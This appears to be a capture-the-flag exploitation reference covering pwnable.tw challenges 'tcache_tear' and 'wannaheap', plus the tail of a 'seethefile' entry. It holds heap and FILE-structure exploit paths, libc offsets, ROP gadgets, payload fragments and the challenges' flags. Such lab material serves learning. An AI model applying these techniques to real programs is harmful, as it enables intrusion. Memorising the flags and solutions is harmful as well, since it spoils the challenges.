| libc base leak | `/proc/self/maps` via open/read/write | Deterministic |
| Heap base leak | `/proc/self/maps` (bonus, not needed) | Deterministic |
| Stack address leak | `/proc/self/stat` (field 28) | Deterministic |
| BSS overflow → `fp` overwrite | `scanf("%s", name)` with >32 bytes | Deterministic |
| Fake `_IO_FILE_plus` in BSS | Payload placed after `name` buffer | Deterministic |
| `system` via vtable hijack | `fclose(fake_fp)` → `_IO_FINISH` | ~100% (retry if scanf-terminator byte in addr) |

### Assets and Provenance

#### Solution Write-ups

| File | Variant | Key Technique | Notes |
|------|---------|---------------|-------|
| `370.md` | Standard | maps leak → FSOP `__finish` → system | Clean, concise |
| `331.md` | Format string | Fake fread→printf for leak, then FSOP | Two-stage, avoids /proc |
| `385.md` | Standard | maps leak → FSOP → system | Uses ELF symbol offsets |
| `654.md` | Standard | maps + heap leak → FSOP | More complex struct layout |
| `799.md` | Standard | maps leak → FSOP `__close` path | Targets different vtable slot |
| `823.md` | Standard | maps leak → FSOP → get_flag | Automated flag retrieval |
| `1006.md` | Format string | fread→printf leak, two exits | Creative vtable swap |
| `1236.md` | Stack pivot | maps leak → add_esp gadget → ROP | Uses gadget instead of direct system |
| `1395.md` | Standard | maps leak → FSOP | Straightforward |
| `1689.md` | Standard | maps leak → FSOP | Minimal payload |
| `1902.md` | Standard | maps leak → FSOP | Targets __close vtable offset |
| `1922.md` | Standard | maps leak → FSOP `__finish` | Clean struct layout |
| `2903.md` | Standard | maps leak → FSOP | Well-commented |
| `9418.md` | Standard | maps leak → FSOP with gdb analysis | Includes FILE struct walkthrough |
| `9871.md` | Standard | maps leak → FSOP | Also leaks heap and stack via /proc |
| `14605.md` | Standard | maps leak → FSOP | Also leaks stack via /proc/self/stat |
| `26585.md` | Standard | maps leak → FSOP | Uses _IO_old_fclose path variant |
| `28356.md` | Standard | maps leak → FSOP | Simple and clean |
| `34604.md` | Standard | maps leak → FSOP with detailed analysis | Best documented; includes glibc source walkthrough |
| `36233.md` | Standard | maps leak → FSOP with detailed vtable docs | Includes vtable struct layout and fclose source code |
| `37983.md` | Standard | maps leak → _IO_old_fclose variant | Uses fsop_fclose_old flat() layout |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (pure sockets, no pwntools) |
| `desc.txt` | Challenge description |
| `artifacts/seethefile` | Challenge binary (i386, No PIE) |
| `artifacts/libc_32.so.6` | Remote libc (glibc 2.23, i386) |
| `solution/*.md` | Community write-ups (146 solutions) |

## tcache_tear
> **Canonical route:** Global freed-pointer UAF → glibc-2.27 tcache double-free, BSS fake chunks, `__free_hook`, format chain, or stdout FSOP
> **Read this case when:** A global pointer remains usable after free under glibc 2.27.
> **Primary defect:** Global freed-pointer UAF
> **Exploit primitive/result:** glibc-2.27 tcache double-free, BSS fake chunks, `__free_hook`, format chain, or stdout FSOP
> **Search terms:** tcache tear; global UAF; double free; `0x602060`; BSS chunk; `__free_hook`
> **Version/protection clue:** Case target `tcache_tear` — x86-64, glibc 2.27, Full RELRO, canary/NX, no PIE, FORTIFY
> **Variant boundary:** Standalone; glibc-2.27 behavior is central; do not import 2.29 key rules blindly.

### Metadata

- Source title: Tcache Tear — pwnable.tw (200 pts)
- Source callout: `nc chall.pwnable.tw 10207`
- Source note: >
- Source callout: Flag: `FLAG{tc4ch3_1s_34sy_f0r_y0u}`

```yaml
tags:
  - double-free
  - tcache-poisoning
  - arbitrary-write
platform: pwnable.tw
points: 200
arch: x86-64
libc: glibc-2.27
relro: full
canary: yes
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "A double-free in tcache memory allows linking arbitrary memory addresses into the tcache list, forging chunks over __free_hook to execute system."
proof-of-concept: no
```

### Facts

#### Challenge Overview

A simple heap note program (x86-64, No PIE, Full RELRO, NX, Canary, FORTIFY) built against **glibc 2.27** (tcache-enabled). The binary provides four operations: malloc+write, free, info (print name), and exit. The program stores a 0x20-byte "Name" in a BSS buffer at `0x602060`, then enters a menu loop with a single heap pointer tracked globally.

```
checksec:
  Arch:     amd64-64-little
  RELRO:    Full RELRO            # GOT not writable
  Stack:    Canary found
  NX:       NX enabled
  PIE:      No PIE (0x400000)     # fixed addresses in BSS
  FORTIFY:  Enabled
```

##### Menu Operations

| Choice | Action |
|--------|--------|
| 1 — Malloc | `malloc(size)` where `size <= 0xFF`, reads `size` bytes into the chunk, stores pointer at `0x602088` |
| 2 — Free | `free(ptr)` — frees the chunk at `0x602088`, does **not** NULL the pointer |
| 3 — Info | Prints 0x20 bytes from the Name buffer at `0x602060` via `write(1, name, 0x20)` |
| 4 — Exit | Calls `exit(0)` |

##### Key BSS Layout

```
0x602040  stdout (pointer to _IO_2_1_stdout_)
0x602060  Name buffer (0x20 bytes, written once at start)
0x602080  [padding]
0x602088  last_malloc_ptr (the single tracked heap pointer)
```

#### Vulnerabilities

##### V1 — Tcache Double-Free (Primary, Exploitable)

**Root Cause:** The free operation does **not** NULL out the global pointer at `0x602088` after freeing. glibc 2.27's tcache has no double-free detection (no key/count checks), so the same chunk can be freed twice.

```c
// Pseudocode for free operation
void do_free() {
    free(*(void **)0x602088);  // frees chunk
    // pointer NOT zeroed — still points to freed chunk
}
```

**Impact:** Classic tcache double-free → tcache poisoning. After double-free, the same chunk appears twice in the tcache freelist. Allocating it back lets the attacker overwrite its `fd` pointer with an arbitrary address, causing subsequent allocations to return controlled addresses.

##### V2 — Heap Overflow on Small Sizes (Exploitable)

**Root Cause:** The malloc operation reads `size` bytes of data into the chunk, but when `size < 0x10`, the actual allocation is still `malloc(size)` (minimum chunk size 0x20). The `read` call uses the **user-supplied size** rather than the actual chunk size. However, the initial `read` for the name buffer and the data read both allow writing more than the nominal size in certain code paths.

More critically, several solutions exploit that calling `malloc(0)` or very small sizes followed by writing large payloads works because the `read(0, buf, size)` with size=0 returns immediately, but the data buffer at `0x602088` still points to the chunk — and subsequent operations (especially crafting fake chunks in BSS) rely on the fixed BSS layout rather than the heap overflow itself.

**Impact:** Enables writing large payloads (fake chunk headers, padding) needed to set up unsorted bin chunks in BSS.

##### V3 — Fixed BSS Address (Name Buffer as Fake Chunk) (Enabler)

**Root Cause:** No PIE means the Name buffer at `0x602060` and the pointer at `0x602088` are at **fixed, known addresses**. The attacker can:
1. Write fake chunk metadata into the Name buffer at program start
2. Use tcache poisoning to allocate chunks overlapping the Name buffer
3. Forge large (unsorted-bin-sized) chunks in BSS to get libc pointers written there

```c
// At startup:
write(1, "Name:", 5);
read(0, name_buf, 0x20);  // name_buf = 0x602060
// Attacker writes: p64(0) + p64(0x501)  → fake chunk header
```

#### Offsets (Remote libc, glibc 2.27)

```python
# libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so
main_arena  = 0x3EBC40    # main_arena+96 = 0x3EBCA0
__free_hook = 0x3ED8E8
__malloc_hook = 0x3EBC30
system      = 0x4F440
one_gadgets = [0x4F2C5, 0x4F322, 0x10A38C]

# BSS (No PIE)
name_buf    = 0x602060
last_ptr    = 0x602088
stdout_ptr  = 0x602040
```

### Exploit Paths

#### Exploit Paths

All solutions exploit V1 (tcache double-free) for tcache poisoning. They diverge on **how they leak libc** and **what they overwrite for code execution**.

---

##### Path A — Tcache Poisoning → Fake Unsorted Bin Chunk in BSS → Leak libc → `__free_hook`

**Used by:** Most solutions (exp.py, 138, 1177, 1297, 1316, 1351, 1763, 10178, 11631, 11699, 13060, 14032, 14334, 14479, 14826, 15522, 16609, and many more)

This is the dominant approach (~90% of solutions).

**Steps:**

1. **Set up fake chunk header in Name buffer.** At the "Name:" prompt, send `p64(0) + p64(0x501)` (or similar large size like `0x421`, `0x511`, `0x531`). This places a fake chunk header at `0x602060` with a size larger than the tcache maximum (0x408 for glibc 2.27), ensuring it goes to the unsorted bin when freed.

2. **Tcache poison to get allocation at BSS.** Use double-free on a tcache-sized chunk:
   ```python
   malloc(0x80, "A")
   free()              # chunk goes to tcache
   free()              # same chunk in tcache again (double-free)
   malloc(0x80, p64(target_bss_addr))  # overwrite fd with BSS address
   malloc(0x80, "dummy")               # consume first copy
   malloc(0x80, payload)               # returns BSS address — write fake chunk body
   ```

3. **Write fake chunk body + next-chunk headers.** The payload placed at the BSS address must include:
   - The fake chunk body (padding to fill the declared size)
   - A valid "next chunk" with `PREV_INUSE` set (to pass `free()`'s consolidation checks)
   - Overwrite `last_malloc_ptr` (`0x602088`) to point to the fake chunk at `0x602060+0x10`

4. **Free the fake chunk.** Since its size exceeds tcache max, it enters the **unsorted bin**. glibc writes `main_arena+96` into the chunk's `fd` and `bk` fields — which now overlap the Name buffer.

5. **Leak libc via Info.** Call Info (choice 3) which prints 0x20 bytes from the Name buffer. The `fd`/`bk` pointers (at offset `+0x10` from the name start) contain `main_arena+96`. Calculate: `libc_base = leaked_value - 0x3ebca0`.

6. **Tcache poison to overwrite `__free_hook`.** Use another double-free on a different tcache bin:
   ```python
   malloc(0x50, "A"); free(); free()
   malloc(0x50, p64(libc + __free_hook))
   malloc(0x50, "dummy")
   malloc(0x50, p64(libc + system))  # or one_gadget
   ```

7. **Trigger shell.**
   - `malloc(0x30, "/bin/sh\x00"); free()` → calls `system("/bin/sh")` via the hooked `free`.
   - Or write `one_gadget` to `__free_hook`/`__malloc_hook` and trigger.

**Reliability:** 100% deterministic — no ASLR brute-forcing needed since BSS addresses are fixed.

---

##### Path B — Tcache Poisoning → `_IO_2_1_stdout_` FSOP Leak → `__free_hook`

**Used by:** Solutions 11968, 13424

This variant leaks libc by corrupting `stdout`'s FILE structure instead of forging unsorted bin chunks.

**Steps:**

1. **Tcache poison targeting `stdout` pointer.** Use double-free to allocate a chunk at `0x602040` (the `stdout` GOT-like pointer in BSS). Overwrite the low byte of `_IO_2_1_stdout_`'s address to redirect it, or poison the tcache to allocate directly at `_IO_2_1_stdout_`.

2. **Corrupt `_IO_2_1_stdout_` flags and write pointers.** Write:
   ```python
   p64(0xFBAD1800) +  # _flags: _IO_MAGIC | _IO_IS_APPENDING | _IO_CURRENTLY_PUTTING
   p64(0) * 3 +       # _IO_read_ptr, _IO_read_end, _IO_read_base = 0
   b'\x00'             # partial overwrite of _IO_write_base → leak from lower address
   ```

3. **Receive libc leak.** The next `write` through stdout leaks data from the libc data segment, giving a libc pointer.

4. **Same finish as Path A:** `__free_hook = system`, then `free("/bin/sh")`.

**Reliability:** May require partial byte brute-force (~1/16) if ASLR randomizes the `_IO_2_1_stdout_` address nibble.

---

##### Path C — Tcache Poisoning → `printf` via `__free_hook` → Format String → `system`

**Used by:** Solution 13424

A creative two-stage approach:

1. **Partial overwrite of `stderr` pointer** in BSS to point near `__free_hook` (requires 1-byte brute-force on ASLR).
2. **Write `printf@plt` to `__free_hook`** via tcache poisoning.
3. **`malloc` a chunk containing a format string** (`%23$lx`), then `free()` it → `printf("%23$lx")` leaks a libc return address from the stack.
4. **Parse the leak**, compute `system` address, overwrite `__free_hook` again with `system`.
5. **`free("/bin/sh\x00")` → shell.**

**Reliability:** ~1/16 due to 4-bit ASLR brute-force.

---

##### Path D — Heap Overflow + Unsorted Bin Attack (Variant)

**Used by:** Solution 1324

Some solutions skip tcache poisoning to BSS and instead use a heap buffer overflow from small-sized allocations to corrupt adjacent tcache chunks' metadata, then pivot into unsorted bin leak.

**Steps:**
1. Allocate chunks of different sizes to create adjacent tcache entries.
2. Use the overflow from a small allocation to corrupt `fd` pointers of adjacent freed chunks.
3. Redirect allocations to BSS or other controlled areas.
4. Proceed with libc leak and `__free_hook` overwrite.

---

##### Path E — Tcache Struct Manipulation

**Used by:** Solution 138

This advanced approach overwrites the **tcache_perthread_struct** (the per-thread tcache metadata at the start of the heap) to manipulate bin counts and entries directly:

1. Tcache-poison to allocate at the tcache struct.
2. Set a bin's count to a high value (making tcache think it's "full").
3. Subsequent frees of that size go to fastbins/unsorted bin instead of tcache → leak `main_arena` pointers.
4. Further FSOP tricks with `_IO_2_1_stdout_` to leak libc.

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Tcache double-free | V1: no pointer NULL after free | Deterministic |
| Tcache poisoning (arbitrary alloc) | V1 + glibc 2.27 no tcache checks | Deterministic |
| Fake unsorted bin chunk in BSS | V3: No PIE + Name buffer | Deterministic |
| libc leak via unsorted bin fd/bk | Fake chunk free → Info | Deterministic |
| libc leak via `_IO_2_1_stdout_` | FSOP partial overwrite | ~1/16 brute |
| `__free_hook` overwrite | Tcache poisoning to hook addr | Deterministic |
| Code execution | `free("/bin/sh")` → `system` | Deterministic |

### Assets and Provenance

#### Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `exp.py` | A | tcache dup → fake 0x421 chunk in BSS → leak → `__free_hook` = one_gadget | Clean reference exploit |
| `138.md` | E | tcache struct manipulation → FSOP stdout leak | Ruby; most complex approach |
| `1177.md` | A | fake 0x701 chunk → unsorted bin leak → `__free_hook` = system | Standard approach |
| `1297.md` | A | fake 0x91 chunk at BSS+0x98 → leak → `__free_hook` = one_gadget | Compact |
| `1316.md` | A | fake 0x431 chunk → cyclic padding → `__free_hook` = system | Detailed comments |
| `1324.md` | D | heap overflow to corrupt tcache fd → BSS fake chunk | Overflow variant |
| `1351.md` | A | fake 0x501 chunk → one_gadget | Minimal |
| `1763.md` | A | fake 0x511 chunk → `__free_hook` = system | Minimal |
| `10178.md` | A | fake 0x501 chunk → `__free_hook` = system | Uses ptrlib |
| `11631.md` | A | fake 0x501 chunk → `__free_hook` = one_gadget | Standard |
| `11968.md` | B | stdout overwrite → FSOP libc leak → `__free_hook` = system | No fake chunk needed |
| `13060.md` | A | tcache dup → fake 0x421 chunk → one_gadget | Clean |
| `13424.md` | C | stderr brute → `printf@plt` in free_hook → fmt string leak → system | Two-stage; creative |
| `14032.md` | A | fake 0x111 chunk → one_gadget | Small fake chunk |
| `14334.md` | A | 0x500 unsorted chunk → detailed walkthrough | Best commented solution |
| `14479.md` | A | fake 0x531 chunk → one_gadget | Standard with flag |
| `14826.md` | A | fake 0x461 chunk → `__free_hook` = system | Uses `malloc(0, payload)` |
| `15522.md` | A | fake 0x501 chunk → one_gadget | Standard |
| `16609.md` | A | fake 0x418 chunk → system | Well-structured |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (no pwntools dependency) |
| `desc.txt` | Challenge description |
| `artifacts/tcache_tear` | Original challenge binary (stripped, x86-64) |
| `solution/*.md` | Community write-ups (128 solutions) |

## wannaheap
> **Canonical route:** Remembered-size mismatch off-by-null → libc/stdin FILE corruption, FSOP, `_dl_open_hook`, setcontext ORW, or byte oracle
> **Read this case when:** The program remembers oversized `S1` but allocates smaller `S2`, then writes NUL using the remembered size.
> **Primary defect:** Remembered-size mismatch off-by-null
> **Exploit primitive/result:** libc/stdin FILE corruption, FSOP, `_dl_open_hook`, setcontext ORW, or byte oracle
> **Search terms:** WannaHeap; remembered size; off-by-null; no free; stdin FSOP; FD 1 closed
> **Version/protection clue:** Case target `wannaheap` — x86-64, glibc 2.24, Full RELRO, canary/NX/PIE, seccomp
> **Variant boundary:** Standalone; use FD 0 for output and ORW because seccomp and closed stdout constrain the finish.

### Metadata

- Source title: WannaHeap — pwnable.tw (400 pts)
- Source callout: `nc chall.pwnable.tw 10305`
- Source note: >
- Source callout: Flag: `FLAG{I_w4nt_2_pl4y_w1th_f1l3_str34m}`

```yaml
tags:
  - off-by-null
  - heap-consolidation
  - arbitrary-write
platform: pwnable.tw
points: 400
arch: x86-64
libc: glibc-2.24
relro: full
canary: yes
nx: yes
pie: yes
references:
  - https://pwnable.tw/challenge/
description: "An off-by-null byte in treap key insertion triggers backward heap consolidation across active tree nodes, achieving arbitrary write in glibc 2.24."
proof-of-concept: no
```

### Facts

#### Challenge Overview

A treap (tree-heap) based key-value store binary (x86-64, Full RELRO, PIE, NX, Stack Canary) running on **Ubuntu 17.04 with glibc 2.24** — the first glibc version to introduce `_IO_vtable_check`, and notably **without tcache**. A **seccomp** sandbox blocks `execve` and restricts `read` to `count <= 0x1337`, `mmap` to non-executable pages. No `free` is implemented. The flag must be read via ORW (open/read/write).

```
checksec:
  Arch:     amd64-64-little
  RELRO:    Full RELRO           # GOT read-only
  Stack:    Canary found
  NX:       NX enabled
  PIE:      PIE enabled
  seccomp:  ALLOW open/read(≤0x1337)/write/close/munmap/mmap(no EXEC)/rt_sigreturn/exit/exit_group
```

##### Program Flow

1. **Create data heap**: Asks for `Size` → `calloc(size+1)` → reads `Content`. A second size is asked if the first exceeds `0x313370`.
2. **Menu**: `[A]llocate` (insert key+data into treap), `[R]ead` (find by key, print data, then **`close(1)`**), `[F]ree` (not implemented), `[E]xit`.
3. Seccomp is installed **after** the data heap creation (so the initial `read` is unrestricted).

#### Key Data Structures

##### Treap Node (0x28 bytes, randomly padded in custom allocator)

| Offset | Field | Type |
|--------|-------|------|
| `0x00` | `left_child` | `node *` |
| `0x08` | `right_child` | `node *` |
| `0x10` | `key` | `uint64_t` |
| `0x18` | `data_ptr` | `char *` (via `strdup`) |
| `0x20` | `priority` | `uint32_t` (from `/dev/urandom`) |

The custom allocator calls `calloc(0x28 + rand()%535 + rand()%8560)` and places the node at a random offset within the chunk (padded with `0xda` before and `0x42` after), making heap layout unpredictable.

#### Vulnerabilities

##### V1 — Arbitrary Null-Byte Write Relative to Data Heap (Primary)

**Root Cause:** In the "Create data heap" function, the first `scanf`-ed size `S1` is remembered. If `S1 > 0x313370`, the program re-prompts until a valid `S2 ≤ 0x313370` is given. The buffer is allocated with `S2`, but the null terminator is written at offset `S1`:

```c
scanf("%lu", &size);
uVar1 = size;                        // remember S1
while (size > 0x313370) {
    scanf("%lu", &size);             // get S2
}
buf = calloc(1, size + 1);          // allocate with S2
read_n(buf, size);                   // read S2 bytes
*(char*)(buf + uVar1) = 0;          // NULL write at S1 offset!
```

**Impact:** Since `calloc` of a large size (e.g., `0x300000`) uses `mmap`, which lands at a **fixed offset below libc**, `S1` can target any byte in the libc writable segment. The critical target is `_IO_2_1_stdin_->_IO_buf_base` (at `stdin + 0x38`), whose LSB is cleared to `\x00`.

**Trigger:**
```python
S1 = mmap_gap + libc.sym['_IO_2_1_stdin_'] + 0x38 - 0x10
# Typical values: 0x6c28e8 or 0x6d58e8 depending on mmap_gap (0x301000 or 0x314000)
S2 = 0x300000  # or 0x313370
```

After the null write, `_IO_buf_base` changes from `stdin+0x83` → `stdin+0x00` (or `stdin+0x40` depending on alignment), so subsequent stdin reads write **directly into the FILE structure**, including `_IO_buf_end` — which can then be extended to cover `main_arena` and beyond.

##### V2 — Uninitialized Stack Buffer Leak in `strdup`

**Root Cause:** When `Allocate` reads the data field, it uses `read_n` into a **stack buffer of 0x18 bytes that is never zeroed**. The result is passed to `strdup`, which copies until the first `\0`.

```c
char buf[0x18];  // uninitialized!
read_n(buf, 0x18);
node->data = strdup(buf);
```

**Impact:** At treap insertion depth 2, `buf+8` on the stack contains a residual pointer to `_IO_2_1_stdout_` (whose LSB is `\x00`). By sending exactly **9 bytes** of data, the 9th byte overwrites that `\x00`, causing `strdup` to copy the remaining 5 bytes of the stdout pointer. Reading it back via `[R]ead` leaks `stdout >> 8`, yielding `libc_base`.

```python
# Leak: send 9 bytes, read back, extract bytes [9:14]
stdout_partial = u64(b'\x00' + leaked_5_bytes + b'\x00\x00')
libc_base = stdout_partial - libc.sym['_IO_2_1_stdout_']
```

This leak is probabilistic (~50%) since the treap's random priorities determine which node is at depth 2. Solutions retry until successful.

#### Offsets (libc 2.24-9ubuntu2.2, sha1 4e5dfd83...)

```python
_IO_2_1_stdin_   = 0x3c18c0
_IO_2_1_stdout_  = 0x3c2600
_IO_file_jumps   = 0x3be400
_IO_str_jumps    = 0x3be4c0
_IO_wfile_jumps  = 0x3bdec0
_dl_open_hook    = 0x3c62e0
main_arena       = 0x3c1b00
__malloc_hook    = 0x3c1af0
__free_hook      = 0x3c3788
_IO_stdfile_0_lock = 0x3c3770
setcontext       = 0x48010     # +53 = 0x48045
open / read / write = 0xf8660 / 0xf8880 / 0xf88e0

# Gadgets
mov_rdi_rax_call = 0x6ebbb     # mov rdi, rax; call [rax+0x20]
pop_rdi = 0x1fd7a
pop_rsi = 0x1fcbd
pop_rdx = 0x1b92
pop_rax = 0x3a998
pop_rdx_rsi = 0x116d69
syscall_ret = 0xbc765
ret = 0x937

# Null write target (varies by mmap gap)
# mmap_gap = 0x301000 → S1 = 0x6c28e8
# mmap_gap = 0x314000 → S1 = 0x6d58e8
```

### Exploit Paths

#### Exploit Paths

All solutions share V1 (null-byte write on `stdin->_IO_buf_base`) + V2 (libc leak via uninitialized stack). They diverge on the FSOP / code execution strategy.

---

##### Path A — `_dl_open_hook` via Unsorted Bin Attack + `setcontext` → ORW ROP

**Used by:** Solutions 194, 821, 1155, 1763, 1922, 7905, 8153, 31599, exp.py

**Steps:**

1. **Null-byte write** `stdin->_IO_buf_base` LSB → stdin buffer now overlaps the FILE struct.
2. **Leak libc** via V2 (allocate two nodes, read back the second).
3. **Extend `_IO_buf_end`**: First stdin read after the null write overwrites `_IO_buf_end` (at `stdin+0x40`), extending it to cover `main_arena`.
4. **Overwrite everything in one shot**: A single large `send()` rewrites:
   - `stdin` FILE struct (fix `_lock`, `vtable = _IO_file_jumps` to pass vtable check, extend `_IO_buf_end`)
   - `_IO_wide_data_0` area (embed a **fake unsorted bin chunk** with `bk = _dl_open_hook - 0x10`)
   - `main_arena` (forge `bins[]` to point at fake chunk; set `top = gadget(mov rdi,rax; call [rax+0x20])`; embed `setcontext+53` and a ucontext frame for stack pivot)
5. **Trigger**: The payload byte at the right offset happens to be `'A'` → triggers `Allocate` → `calloc` → walks the forged unsorted bin → **unsorted bin attack** writes `&main_arena+0x58` into `_dl_open_hook`.
6. **Crash path**: `malloc` detects corruption → `malloc_printerr` → `__libc_message(do_abort)` → `__backtrace` → `__libc_dlopen_mode("libgcc_s.so.1")` → `_dl_open` sees `_dl_open_hook != NULL` → calls `(*_dl_open_hook->dlopen_mode)()`.
7. `rax = _dl_open_hook = main_arena+0x58`, which points to gadget `mov rdi, rax; call [rax+0x20]` → calls `setcontext+53` with controlled `rdi` → **stack pivot** to ORW ROP chain.
8. **ROP**: `open("/home/wannaheap/flag") → read(1, buf, 0x100) → write(0, buf, 0x100)`.

**Key detail:** `Read` calls `close(1)`, so `open` returns fd 1. Output must go to fd 0 (the socket), since fd 2 is `/dev/null` on the server.

---

##### Path B — `_IO_str_overflow` vtable hijack + `setcontext` → ORW ROP

**Used by:** Solutions 369, 2972, 6247, 36997

glibc 2.24's `_IO_vtable_check` allows vtables within the `__libc_IO_vtables` section. `_IO_str_jumps` is in that range, so pointing a FILE's vtable to an offset within `_IO_str_jumps` passes the check. `_IO_str_overflow` calls `fp->_s._allocate_buffer(new_size)` — a function pointer at `fp+0xe0`.

**Steps:**

1-3. Same as Path A (null write, leak, extend `_IO_buf_end`).
4. **Forge stdout**: Overwrite `_IO_2_1_stdout_` with a crafted FILE:
   - `vtable = _IO_str_jumps - 0x20` (offset so `__xsputn` slot maps to `_IO_str_overflow`)
   - `_IO_buf_end = (target_rdi - 100) / 2` (controls the `new_size` argument)
   - `fp->_s._allocate_buffer = setcontext+53` (at `fp+0xe0`)
5. **Trigger**: The `'E'` byte in the payload triggers `Exit` → `puts("Goodbye")` → `__xsputn` on stdout → `_IO_str_overflow` → `call [fp+0xe0]` = `setcontext+53`.
6. `setcontext` pivots stack to ORW ROP chain.

---

##### Path C — `_IO_wstr_finish` / `_IO_wfile_jumps` vtable hijack + Stack Pivot → ORW ROP

**Used by:** Solutions 8153, 36997 (variant)

Uses `_IO_wfile_jumps` (also in the valid vtable section). `_IO_wstr_finish` calls `fp->_wide_data->_wide_vtable->__doallocate(fp)` — a chain of indirect calls that can be pointed to a stack-pivot gadget.

**Steps:**

1-3. Same as Path A.
4. **Forge stdout**: Set `vtable = _IO_wfile_jumps + offset`, `_wide_data` pointing to a controlled region with a fake wide vtable containing `xchg rax, rsp; ret` or `call [rdi+0x18]` → `setcontext+53`.
5. **Trigger**: `puts` on stdout → wide vtable dispatch → stack pivot → ORW ROP.

---

##### Path D — `__free_hook` + `setcontext` via stdin Manipulation (No Unsorted Bin Attack)

**Used by:** Solution 186

**Steps:**

1-3. Same as Path A.
4. Instead of unsorted bin attack, directly control `stdin->_IO_markers`, `_IO_save_base`, `_IO_save_end`, and `_IO_read_base` to trigger libc's internal `malloc()`, `free()`, and `memcpy()` calls during stdin buffer management.
5. Arrange heap so that `free()` is called on a controlled buffer, then overwrite `__free_hook` with `setcontext+53 - 7` (avoiding the `0x45 = 'E'` byte that triggers Exit).
6. Trigger `free()` with controlled `rdi` → `setcontext` → ORW ROP.

---

##### Path E — Side-Channel Flag Leak (Byte-at-a-time)

**Used by:** Solution 369, 1351

After gaining ROP, instead of directly outputting the flag:
1. `open` + `read` the flag into memory.
2. Use comparison gadgets (`cmp byte ptr [rax], dl; ret`, `setbe al; ret`) to compare each flag byte against a guessed value.
3. Based on the comparison result, either `read` from the socket (hangs waiting for input = flag byte ≥ guess) or trigger EOF (flag byte < guess) → binary search.

This is slower but works even if direct `write` to the socket is unreliable.

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Arbitrary null-byte write to libc | V1: size mismatch in data heap creation | Deterministic (mmap offset is fixed) |
| stdin FILE struct overwrite | V1 → `_IO_buf_base` LSB cleared | Deterministic |
| libc base leak | V2: uninitialized stack in `strdup` | ~50% per connection (treap depth) |
| `_IO_buf_end` extension | Overwrite via corrupted stdin buffer | Deterministic after V1 |
| `main_arena` overwrite | Extended stdin buffer reaches `main_arena` | Deterministic after extension |
| Code execution | FSOP (multiple paths: `_dl_open_hook`, `_IO_str_overflow`, `_IO_wstr_finish`, `__free_hook`) | Deterministic after libc leak |
| ORW flag read | ROP chain: `open→read→write(fd=0)` | Deterministic |

### Assets and Provenance

#### Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `186.md` | D | stdin manipulation → `__free_hook` + `setcontext` | No unsorted bin attack; no FSOP vtable hijack |
| `194.md` | A | `_dl_open_hook` + `setcontext` → ORW | Clean step-by-step explanation |
| `369.md` | B + E | `_IO_str_overflow` + side-channel binary search | Byte-at-a-time flag leak |
| `408.md` | A | `_dl_open_hook` vtable check bypass | Compact exploit |
| `705.md` | B | vtable check bypass via `_dl_find_dso_for_object` + `leave; ret` | Unusual RBP-based pivot |
| `821.md` | A | `_dl_open_hook` + `setcontext` → ORW | Detailed struct layout comments |
| `1155.md` | A | `_dl_open_hook` → `setcontext+53` → ORW | Clean modular exploit |
| `1351.md` | B + E | `_IO_str_overflow` + side-channel | Binary search with `cmp`/`jb` gadgets |
| `1763.md` | A | `_dl_open_hook` + `setcontext` | Random offset handling |
| `1922.md` | A | `_dl_open_hook` + detailed heap layout | Bilingual (Chinese/English) writeup |
| `2972.md` | B | `_IO_str_overflow` + `setcontext` → ORW | Concise; direct flag output |
| `3498.md` | A | `_dl_open_hook` + `setcontext` | Sparse comments, working exploit |
| `6247.md` | A | `_dl_open_hook` + `setcontext` | Full struct reconstruction |
| `7905.md` | A | `_dl_open_hook` + `setcontext` | Detailed variable naming |
| `8153.md` | C | `_IO_wstr_finish` + `xchg rax,rsp` pivot | Alternative vtable path |
| `31599.md` | A | `_dl_open_hook` + detailed writeup (Chinese) | Most comprehensive analysis |
| `36997.md` | C | `_IO_wfile_jumps` + `call [rdi+0x18]` → `setcontext` | Modern FSOP approach |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (`_dl_open_hook` path) |
| `desc.txt` | Challenge description |
| `artifacts/` | Original binary |
| `solution/*.md` | Community write-ups (39 solutions) |
